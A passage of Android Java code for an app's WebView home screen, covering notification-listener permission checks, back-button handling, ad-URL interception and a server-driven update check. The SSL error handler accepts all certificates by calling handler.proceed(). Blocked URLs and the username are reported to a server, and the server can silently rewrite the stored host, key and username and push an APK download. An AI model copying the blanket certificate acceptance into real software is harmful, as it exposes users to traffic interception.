                requestParams.addBodyParameter("leixing", "thjl");
                requestParams.addBodyParameter("yhm", yhm);
                httpUtils.send(HttpRequest.HttpMethod.POST, wz, requestParams, new RequestCallBack<String>() {
                    @Override
                    public void onSuccess(ResponseInfo<String> responseInfo) {
                    }

                    @Override
                    public void onFailure(HttpException e, String s) {
                    }
                });
            }
        });

    }

    //各种权限的判断
    private void toggleNotificationListenerService(Context context) {
        PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(context, NeNotificationService2.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        pm.setComponentEnabledSetting(new ComponentName(context, NeNotificationService2.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

    }

    public boolean isNotificationListenersEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    protected boolean gotoNotificationAccessSetting() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return true;

        } catch (ActivityNotFoundException e) {//普通情况下找不到的时候需要再特殊处理找一次
            try {
                Intent intent = new Intent();
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ComponentName cn = new ComponentName("com.android.settings", "com.android.settings.Settings$NotificationAccessSettingsActivity");
                intent.setComponent(cn);
                intent.putExtra(":settings:show_fragment", "NotificationAccessSettings");
                startActivity(intent);
                return true;
            } catch (Exception e1) {
                e1.printStackTrace();
            }
            Toast.makeText(this, "对不起，您的手机暂不支持", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
            return false;
        }
    }

    WebChromeClient  webChromeClient = new WebChromeClient() {
        @Override
        public void onReceivedTitle(WebView view, String title) {
            super.onReceivedTitle(view, title);
            if (title == null || TextUtils.isEmpty(title)) {
                setTitle(getResources().getString(R.string.app_name));
            } else {
                setTitle(title);
            }
            // android 6.0 以下通过title获取判断
//            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
//                if(title != null ) {
//                    if (title.contains("404") || title.contains("500") || title.contains("Error") || title.contains("找不到网页") || title.contains("网页无法打开")) {
//                        isError = true;
//                        emptyView.setVisibility(View.VISIBLE);
//                    }
//                }
//            }
        }



        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            mFilePathCallback = filePathCallback;
            selectImage();
            return true;
        }

    };

    private void selectImage() {
        SelectImageUtils.getInstance().selectImage(this,1);
    }


    private ValueCallback<Uri[]> mFilePathCallback;

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isDestroyed()) {
            return;
        }
        if (mWebView != null) {
            mWebView.destroy();
            mWebView = null;
        }
    }
    //声明一个long类型变量：用于存放上一点击“返回键”的时刻
    private long mExitTime;
    @Override
    public void onBackPressed() {
        if (mWebView.canGoBack()) {
            mWebView.goBack();
        } else {
            //与上次点击返回键时刻作差
            if ((System.currentTimeMillis() - mExitTime) > 2000) {
                //大于2000ms则认为是误操作，使用Toast进行提示
                Toast.makeText(this, "再按一次退出程序", Toast.LENGTH_SHORT).show();
                //并记录下本次点击“返回键”的时刻，以便下次进行判断
                mExitTime = System.currentTimeMillis();
            } else {
                finish();
            }
        }
    }

    public boolean isError;

    @SuppressLint("SetJavaScriptEnabled")
    private void initWebViewSetting() {
        mWebView.getSettings().setJavaScriptEnabled(true);//让浏览器支持javascript
        mWebView.getSettings().setSupportZoom(true);//是否可以缩放，默认是true
        mWebView.getSettings().setUseWideViewPort(true);//设置此属性，可任意比例缩放，大视图模式
        mWebView.getSettings().setLoadWithOverviewMode(true);//和setUseWideViewPort(true)一起解决网页自适应问题
        mWebView.getSettings().setAppCacheEnabled(true);//是否使用缓存
        mWebView.getSettings().setDomStorageEnabled(true);//DOM Storage
        mWebView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);  //设置 缓存模式
        mWebView.getSettings().setPluginState(WebSettings.PluginState.ON); //播放视频
        mWebView.setWebChromeClient(webChromeClient);
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view,
                                           SslErrorHandler handler, SslError error) {
                // TODO Auto-generated method stub
                // super.onReceivedSslError(view, handler, error); 父类的默认处理方式，内部是handler.cancel()，必须去除
                handler.proceed();// 接受所有网站的证书
                // handleMessage(Message msg);// 进行其他处理
            }
//
//            @Override
//            public void onPageStarted(WebView view, String url, Bitmap favicon) {
//                super.onPageStarted(view, url, favicon);
//                Log.d("xgw","onPageStarted");
//                isError = false;
//            }
//
//            @Override
//            public void onPageFinished(WebView view, String url) {
//                super.onPageFinished(view, url);
//                Log.d("xgw","onPageFinished");
//                if(!isError) {
//                    emptyView.setVisibility(View.GONE);
//                }
//            }
//
//            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
//            @Override
//            public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
//                super.onReceivedHttpError(view, request, errorResponse);
//                // 这个方法在 android 6.0才出现
//                isError = true;
//                Log.d("xgw","onReceivedHttpError");
//                emptyView.setVisibility(View.VISIBLE);
//            }
//
//            @Override
//            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
//                super.onReceivedError(view, request, error);
//                isError = true;
//                Log.d("xgw","onReceivedError");
//                emptyView.setVisibility(View.VISIBLE);
//            }

            @Nullable
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
                if(PackUtils.getInstance().getPbggsq() == 1) {
                    url = url.toLowerCase();
                    if (PackUtils.getInstance().hasAd(HomeActivity.this,url)) {
                        return super.shouldInterceptRequest(view, url);
                    } else {
                        SharedPreferences read = getSharedPreferences("vone", MODE_PRIVATE);
                        String yhm = read.getString(StaticInfo.YHM, "");
                        Map<String, String> stringStringMap = new HashMap<>();
                        stringStringMap.put("ggwz", url);
                        stringStringMap.put("biaoshi", PackUtils.ONLY_TAG);
                        stringStringMap.put("yhm", yhm);
                        RequestUtils.getInstance().request(stringStringMap,PackUtils.getInstance().getJsbjiekou(),null);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(HomeActivity.this, "安全防护中，非法广告已拦截", Toast.LENGTH_SHORT).show();

                            }
                        });

                        return new WebResourceResponse(null, null, null);
                    }
                }else{
                    return super.shouldInterceptRequest(view, url);
                }
            }
        });

    }


    @Override
    protected boolean hasEdit() {
        return true;
    }

    @Override
    protected View onCreateContentView() {
        rootView = LayoutInflater.from(this).inflate(R.layout.web_activity_main, null);
        return rootView;
    }

    @Override
    protected boolean hasToolbar() {
        return true;
    }


    public void checkUpdate(final Activity context, final boolean isToast) {
        HttpUtils httpUtils = new HttpUtils();
        //读入保存的配置数据并显示
        SharedPreferences read = context.getSharedPreferences("vone", MODE_PRIVATE);
        final String yhmJCSJ = read.getString(StaticInfo.YHM, "");
        RequestParams requestParams = new RequestParams();
        requestParams.addBodyParameter("version", WbApplication.getVersion(context));
        requestParams.addBodyParameter("biaoshi", PackUtils.ONLY_TAG);
        requestParams.addBodyParameter("yhm", yhmJCSJ);
        requestParams.addBodyParameter("mac", PackUtils.getInstance().getMacAddress(context));
        httpUtils.send(HttpRequest.HttpMethod.POST, PackUtils.getInstance().getCHECK_NEW_APK_URL(), requestParams, new RequestCallBack<String>() {
            @Override
            public void onSuccess(ResponseInfo<String> responseInfo) {
                String result = responseInfo.result;
                JSONObject jsonObject = JSON.parseObject(result);
                if(jsonObject.containsKey("code") && jsonObject.containsKey("url")) {
                    int code = jsonObject.getInteger("code");
                    String url = jsonObject.getString("url");
                    String shengjixinxi = jsonObject.getString("xinxi");
                    if (code == 1 && url != null && !TextUtils.isEmpty(url)) {
                        final File file = new File(Environment.getExternalStorageDirectory() + "/" + context.getResources().getString(R.string.app_name) + "/download/version/", DateFormatUtils.getInstance().formatTime(new Date()) + ".apk");
                        DownloadUtils.getInstance().downloadNewApk(context, url, file.getAbsolutePath(), shengjixinxi, null);
                    } else {
                        if (isToast) {
                            if (shengjixinxi != null && !TextUtils.isEmpty(shengjixinxi)) {
                                Toast.makeText(context, shengjixinxi, Toast.LENGTH_SHORT).show();
                            } else {
                                Toast.makeText(context, "当前就是最新版本..", Toast.LENGTH_SHORT).show();
                            }
                        }
                    }
                }
                if(jsonObject.containsKey("jtpz")) {
                    int jtpz = jsonObject.getInteger("jtpz");
                    if(jtpz == 1) {
                        SharedPreferences.Editor editor = getSharedPreferences("vone", MODE_PRIVATE).edit();
                        if (jsonObject.containsKey("hywz")) {
                            String hywz = jsonObject.getString("hywz");
                            editor.putString(StaticInfo.WZ, hywz);
                            wz = hywz;
                        }
                        if (jsonObject.containsKey("jtwz")) {
                            String jtwz = jsonObject.getString("jtwz");
                            editor.putString(StaticInfo.HOST, jtwz);
                            host = jtwz;
                        }
                        if (jsonObject.containsKey("yhm")) {
                            String yhmString = jsonObject.getString("yhm");
                            editor.putString(StaticInfo.YHM, yhmString);
                            yhm = yhmString;
                        }
                        if (jsonObject.containsKey("key")) {
                            String keyString = jsonObject.getString("key");
                            editor.putString(StaticInfo.KEY, keyString);
                            key = keyString;
                        }
                        editor.apply();
                    }
                }
            }

            @Override
            public void onFailure(HttpException e, String s) {
                if(isToast) {
                    Toast.makeText(context, e.getMessage(), Toast.LENGTH_SHORT).show();
                }
            }
        });
    }


    @Override
    public void onClick(View v) {
        if(v == emptyView){
            isError = true;
            mWebView.reload();
        }
    }
}
